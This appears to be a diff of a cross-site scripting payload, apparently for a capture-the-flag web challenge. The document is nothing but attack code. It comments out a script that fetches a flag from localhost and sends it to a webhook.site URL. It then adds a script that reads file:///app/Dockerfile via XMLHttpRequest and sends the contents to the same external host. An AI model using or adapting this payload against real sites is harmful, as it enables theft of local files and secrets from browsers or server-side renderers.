@@ -1,5 +1,17 @@
-<script>
+<!-- <script>
     fetch('http://localhost:1337/flag').then(r => r.text()).then(r => {
         fetch(`https://webhook.site/4e7b8828-d10a-43fb-b659-1b2f40d641b6/?flag=${r}`)
     });
+</script> -->
+
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'file:///app/Dockerfile', true);
+xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+        fetch(`https://webhook.site/4e7b8828-d10a-43fb-b659-1b2f40d641b6/?flag=${xhr.responseText}`); 
+    }
+};
+xhr.send();
+
 </script>
